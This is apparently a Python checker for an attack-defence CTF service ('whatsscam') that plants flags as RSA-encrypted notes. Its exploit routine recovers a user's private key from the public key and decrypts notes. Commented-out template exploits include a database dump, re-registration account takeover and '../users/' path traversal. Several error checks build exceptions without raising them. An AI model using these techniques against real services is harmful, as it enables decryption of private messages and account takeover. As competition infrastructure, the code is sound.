from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
#import faker


from httpx import AsyncClient
from typing import Optional
from logging import LoggerAdapter
from bs4 import BeautifulSoup
import re


import checker_util_func
import rsa




from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""
checker = Enochecker("whatsscam", 5050)
def app(): return checker.app


"""
CHECKER FUNCTIONS
"""
@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    #print("hey")
    email_1, password1_1 = await checker_util_func.create_user(db, client, logger, public_key='on')

    MumbleException("Could not create user")
    await checker_util_func.logout(db, client, logger)
    MumbleException("Could not logout user")

    #print("hey2")
    email_2, password1_2 = await checker_util_func.create_user(db, client, logger, public_key= None)
    MumbleException("Could not create user")

    #print("hey3")
    public_key = await checker_util_func.get_user_of_userlist(db, client, logger, email = email_1)


    #print("hey4")
    note = str(task.flag)
    target_email = email_1
    await checker_util_func.create_note(db ,client, logger, note, public_key)
    MumbleException("Could not create note")

    await db.set("userdata", (email_2, password1_2))
    return email_1


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
) -> None:
    try:
        email, password = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
 
    await checker_util_func.login_user(db, client, logger, email, password)
    MumbleException("Could not login user")

    await checker_util_func.get_note(db, client, logger, note = str(task.flag))
    MumbleException("Could not get note")


@checker.exploit(0)
async def exploit_test(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
    logger: LoggerAdapter,
    searcher: FlagSearcher,
) -> None:
    print("attacke hier")
    print(task.attack_info)
    print(task.flag_hash)
    print(task.flag_regex)

    target_email = task.attack_info
    email_attacker, password = await checker_util_func.create_user(db, client, logger, public_key= None)
    public_key = await checker_util_func.get_user_of_userlist(db, client, logger, email = target_email)
    # response = await client.get("/userlist", follow_redirects=True)
    # soup = BeautifulSoup(response.text, "html.parser")
    # li = soup.find_all("li")
    # li = [x.text for x in li]
    # li = [x.split(" ") for x in li]
    # li = filter(lambda x: target_email + '\n' in x, li)
    # li = filter(lambda x: x != '' and x != '\n' and x != target_email + '\n', list(li)[0])
    # public_key = list(li)
    # public_key = public_key[1].strip()
    print("public_key hier")
    print(public_key)
    public_key = checker_util_func.format_rsa_public_key(public_key)
    key = rsa.PublicKey.load_pkcs1(public_key.encode())
    private_key = checker_util_func.expprime(key)
    private_key = private_key.save_pkcs1().decode()
    print("private_key hier")
    print(private_key)

    get_all_notes = await client.get("/")
    soup_html = BeautifulSoup(get_all_notes.text, "html.parser")
    li = soup_html.find_all("li")
    li = [x.text for x in li]
    li = [x.split(" ") for x in li]
    li = [x.strip() for sublist in li for x in sublist]
    li = [x for x in li if x != '']

    for i in li:
        try:
            decrypted_message = checker_util_func.decryption_of_message(i, private_key)
            print(decrypted_message)
            print("flagggg hier")
            if flag := searcher.search_flag(decrypted_message):
                return flag
        except:
            pass
    
    for i in li:
        try:
            message = i
            print(message)
            print("flagggg hier nicht")
        except:
            print(i)
            print("parser error")
            pass
    raise MumbleException("flag not found")
    


    


    








    # # Log a message before any critical action that could raise an error.
    # logger.debug(f"Connecting to service")
    # welcome = await conn.reader.readuntil(b">")

    # # Register a new user
    # await conn.register_user(username, password)

    # # Now we need to login
    # await conn.login_user(username, password)

    # # Finally, we can post our note!
    # logger.debug(f"Sending command to set the flag")
    # conn.writer.write(f"set {task.flag}\n".encode())
    # await conn.writer.drain()
    # await conn.reader.readuntil(b"Note saved! ID is ")

    # try:
    #     # Try to retrieve the resulting noteId. Using rstrip() is hacky, you should probably want to use regular expressions or something more robust.
    #     noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
    # except Exception as ex:
    #     logger.debug(f"Failed to retrieve note: {ex}")
    #     raise MumbleException("Could not retrieve NoteId")

    # assert_equals(len(noteId) > 0, True, message="Empty noteId received")

    # logger.debug(f"Got noteId {noteId}")

    # # Exit!
    # logger.debug(f"Sending exit command")
    # conn.writer.write(f"exit\n".encode())
    # await conn.writer.drain()
    
    # Save the generated values for the associated getflag() call.
    #await db.set("userdata", (username, password, noteId))

    #return username

# @checker.getflag(0)
# async def getflag_note(
#     task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection
# ) -> None:
#     try:
#         username, password, noteId = await db.get("userdata")
#     except KeyError:
#         raise MumbleException("Missing database entry from putflag")

#     logger.debug(f"Connecting to the service")
#     await conn.reader.readuntil(b">")

#     # Let's login to the service
#     await conn.login_user(username, password)

#     # Let´s obtain our note.
#     logger.debug(f"Sending command to retrieve note: {noteId}")
#     conn.writer.write(f"get {noteId}\n".encode())
#     await conn.writer.drain()
#     note = await conn.reader.readuntil(b">")
#     assert_in(
#         task.flag.encode(), note, "Resulting flag was found to be incorrect"
#     )

#     # Exit!
#     logger.debug(f"Sending exit command")
#     conn.writer.write(f"exit\n".encode())
#     await conn.writer.drain()
        

# @checker.putnoise(0)
# async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to the service")
#     welcome = await conn.reader.readuntil(b">")

#     # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
#     username = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     randomNote = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=36)
#     )

#     # Register another user
#     await conn.register_user(username, password)

#     # Now we need to login
#     await conn.login_user(username, password)

#     # Finally, we can post our note!
#     logger.debug(f"Sending command to save a note")
#     conn.writer.write(f"set {randomNote}\n".encode())
#     await conn.writer.drain()
#     await conn.reader.readuntil(b"Note saved! ID is ")

#     try:
#         noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
#     except Exception as ex:
#         logger.debug(f"Failed to retrieve note: {ex}")
#         raise MumbleException("Could not retrieve NoteId")

#     assert_equals(len(noteId) > 0, True, message="Empty noteId received")

#     logger.debug(f"{noteId}")

#     # Exit!
#     logger.debug(f"Sending exit command")
#     conn.writer.write(f"exit\n".encode())
#     await conn.writer.drain()

#     await db.set("userdata", (username, password, noteId, randomNote))
        
# @checker.getnoise(0)
# async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
#     try:
#         (username, password, noteId, randomNote) = await db.get('userdata')
#     except:
#         raise MumbleException("Putnoise Failed!") 

#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # Let's login to the service
#     await conn.login_user(username, password)

#     # Let´s obtain our note.
#     logger.debug(f"Sending command to retrieve note: {noteId}")
#     conn.writer.write(f"get {noteId}\n".encode())
#     await conn.writer.drain()
#     data = await conn.reader.readuntil(b">")
#     if not randomNote.encode() in data:
#         raise MumbleException("Resulting flag was found to be incorrect")

#     # Exit!
#     logger.debug(f"Sending exit command")
#     conn.writer.write(f"exit\n".encode())
#     await conn.writer.drain()


# @checker.havoc(0)
# async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # In variant 0, we'll check if the help text is available
#     logger.debug(f"Sending help command")
#     conn.writer.write(f"help\n".encode())
#     await conn.writer.drain()
#     helpstr = await conn.reader.readuntil(b">")

#     for line in [
#         "This is a notebook service. Commands:",
#         "reg USER PW - Register new account",
#         "log USER PW - Login to account",
#         "set TEXT..... - Set a note",
#         "user  - List all users",
#         "list - List all notes",
#         "exit - Exit!",
#         "dump - Dump the database",
#         "get ID",
#     ]:
#         assert_in(line.encode(), helpstr, "Received incomplete response.")

# @checker.havoc(1)
# async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # In variant 1, we'll check if the `user` command still works.
#     username = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )

#     # Register and login a dummy user
#     await conn.register_user(username, password)
#     await conn.login_user(username, password)

#     logger.debug(f"Sending user command")
#     conn.writer.write(f"user\n".encode())
#     await conn.writer.drain()
#     ret = await conn.reader.readuntil(b">")
#     if not b"User 0: " in ret:
#         raise MumbleException("User command does not return any users")

#     if username:
#         assert_in(username.encode(), ret, "Flag username not in user output")

#     # conn.writer.close()
#     # await conn.writer.wait_closed()

# @checker.havoc(2)
# async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#     logger.debug(f"Connecting to service")
#     welcome = await conn.reader.readuntil(b">")

#     # In variant 2, we'll check if the `list` command still works.
#     username = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     randomNote = "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=36)
#     )

#     # Register and login a dummy user
#     await conn.register_user(username, password)
#     await conn.login_user(username, password)

#     logger.debug(f"Sending command to save a note")
#     conn.writer.write(f"set {randomNote}\n".encode())
#     await conn.writer.drain()
#     await conn.reader.readuntil(b"Note saved! ID is ")

#     try:
#         noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
#     except Exception as ex:
#         logger.debug(f"Failed to retrieve note: {ex}")
#         raise MumbleException("Could not retrieve NoteId")

#     assert_equals(len(noteId) > 0, True, message="Empty noteId received")

#     logger.debug(f"{noteId}")

#     logger.debug(f"Sending list command")
#     conn.writer.write(f"list\n".encode())
#     await conn.writer.drain()

#     data = await conn.reader.readuntil(b">")
#     if not noteId.encode() in data:
#         raise MumbleException("List command does not work as intended")

# @checker.exploit(0)
# async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
#     welcome = await conn.reader.readuntil(b">")
#     conn.writer.write(b"dump\nexit\n")
#     await conn.writer.drain()
#     data = await conn.reader.read(-1)
#     if flag := searcher.search_flag(data):
#         return flag
#     raise MumbleException("flag not found")

# @checker.exploit(1)
# async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
#     welcome = await conn.reader.readuntil(b">")
#     conn.writer.write(b"user\n")
#     await conn.writer.drain()

#     # TODO: Use flag hints
#     user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#     for user in user_list:
#         user_name = user.split()[-1]
#         conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
#         await conn.writer.drain()
#         await conn.reader.readuntil(b">")  # successfully registered
#         await conn.reader.readuntil(b">")  # successfully logged in
#         notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#         for note in notes_list:
#             note_id = note.split()[-1]
#             conn.writer.write(b"get %s\n" % note_id)
#             await conn.writer.drain()
#             data = await conn.reader.readuntil(b">")
#             if flag := searcher.search_flag(data):
#                 return flag
#     raise MumbleException("flag not found")

# @checker.exploit(2)
# async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
#     welcome = await conn.reader.readuntil(b">")
#     conn.writer.write(b"user\n")
#     await conn.writer.drain()

#     # TODO: Use flag hints?
#     user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#     for user in user_list:
#         user_name = user.split()[-1]
#         conn.writer.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
#         await conn.writer.drain()
#         await conn.reader.readuntil(b">")  # successfully registered
#         await conn.reader.readuntil(b">")  # successfully logged in
#         notes_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
#         for note in notes_list:
#             note_id = note.split()[-1]
#             conn.writer.write(b"get %s\n" % note_id)
#             await conn.writer.drain()
#             data = await conn.reader.readuntil(b">")
#             if flag := searcher.search_flag(data):
#                 return flag
#     raise MumbleException("flag not found")


if __name__ == "__main__":
    checker.run()